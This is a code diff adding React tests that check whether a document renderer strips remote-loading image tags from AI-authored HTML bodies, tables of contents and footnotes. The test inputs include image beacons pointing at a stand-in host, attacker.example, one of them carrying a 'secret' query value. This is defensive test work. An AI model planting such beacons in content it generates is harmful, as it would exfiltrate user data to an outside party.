@@ -128,6 +128,62 @@ describe('ArtifactRenderer chrome', () => {
     expect(screen.getByText('Jaribu tena')).toBeInTheDocument();
   });
 
+  it('strips remote-resource exfil vectors (img beacon) from AI-authored body', () => {
+    // OWASP LLM05: an AI-authored artifact must never be able to beacon out.
+    // The sanitiser drops <img> (and src-bearing loaders) so no remote fetch
+    // fires when the body paints.
+    const { container } = render(
+      <ArtifactRenderer
+        {...BASE}
+        language="en"
+        bodyHtml={
+          '<p>Quarterly numbers.</p>' +
+          '<img src="https://attacker.example/beacon?d=secret" alt="x" />' +
+          '<a href="https://docs.example/ref">Reference</a>'
+        }
+      />,
+    );
+    // The beacon image is gone…
+    expect(container.querySelector('img')).not.toBeInTheDocument();
+    expect(container.innerHTML).not.toContain('attacker.example');
+    // …but legitimate document markup (the anchor, the prose) survives.
+    expect(screen.getByText('Quarterly numbers.')).toBeInTheDocument();
+    expect(screen.getByText('Reference')).toBeInTheDocument();
+  });
+
+  it('strips src-bearing loaders from TOC and footnotes too', () => {
+    const { container } = render(
+      <ArtifactRenderer
+        {...BASE}
+        language="en"
+        bodyHtml="<p>b</p>"
+        tocHtml='<nav><img src="https://attacker.example/toc.gif" /><ol><li>A</li></ol></nav>'
+        footnotesHtml='<section><img src="https://attacker.example/fn.gif" /></section>'
+      />,
+    );
+    expect(container.querySelector('img')).not.toBeInTheDocument();
+    expect(container.innerHTML).not.toContain('attacker.example');
+  });
+
+  it('renders the body sanitised on the FIRST frame (no raw-then-clean)', () => {
+    // The host must never carry an unsanitised beacon even for one frame:
+    // useMemo sanitises during render, so the body host is clean on mount
+    // without waiting for an effect. We never flush effects here.
+    const { container } = render(
+      <ArtifactRenderer
+        {...BASE}
+        language="en"
+        bodyHtml={
+          '<p>Body.</p><img src="https://attacker.example/firstframe.png" />'
+        }
+      />,
+    );
+    const host = container.querySelector('.borjie-artifact-body-host');
+    expect(host).toBeInTheDocument();
+    expect(host?.innerHTML ?? '').not.toContain('attacker.example');
+    expect(host?.querySelector('img')).toBeNull();
+  });
+
   it('reflects the confidential classification on the host element', () => {
     const { container } = render(
       <ArtifactRenderer
